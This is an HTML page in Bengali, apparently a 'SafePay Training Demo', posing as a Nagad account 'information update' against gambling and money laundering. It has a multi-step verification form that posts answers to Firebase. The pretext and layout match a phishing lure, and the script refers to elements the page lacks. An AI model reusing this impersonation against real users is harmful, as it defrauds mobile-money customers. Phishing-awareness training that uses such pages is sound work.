
<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>নগদ তথ্য হালনাগাদ 2026</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <header class="header">
  <div class="logo">
    <img src="images.png" alt="SafePay Logo">
  </div>
  <div class="tag">SafePay Training Demo</div>
    <div class="tag">নগদ তথ্য হালনাগাদ</div>
  </header>

  <main class="container">
    <div class="notice">
      অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026
    </div>


    <section class="card">
      <div class="progress-area">
        <span id="progress">STEP 1 / 4</span>
        <div class="progress-bg">
          <div id="progressBar"></div>
        </div>
      </div>

      <h2 id="title">verification</h2>
      <div id="content"></div>
      <p id="message"></p>
     <div class="button-group">
  <button id="back" type="button">Back</button>
  <button id="next" type="button">Continue</button>
</div>
    <script type="module">
import { submitTrainingQuiz } from "./firebase.js";

const submitButton = document.getElementById("submit");
const message = document.getElementById("message");

submitButton.addEventListener("click", async () => {
  const consent = document.getElementById("consent").checked;
  const demoId = document.getElementById("demoId").value;

  const answers = [1, 2, 3, 4].map(i =>
    document.getElementById("answer" + i).value
  );

  submitButton.disabled = true;
  message.textContent = "Submitting...";

  try {
    await submitTrainingQuiz(consent, demoId, answers);
    message.textContent = "submitted successfully!";
  } catch (error) {
    message.textContent = "Submit failed: " + error.message;
  } finally {
    submitButton.disabled = false;
  }
});
</script>
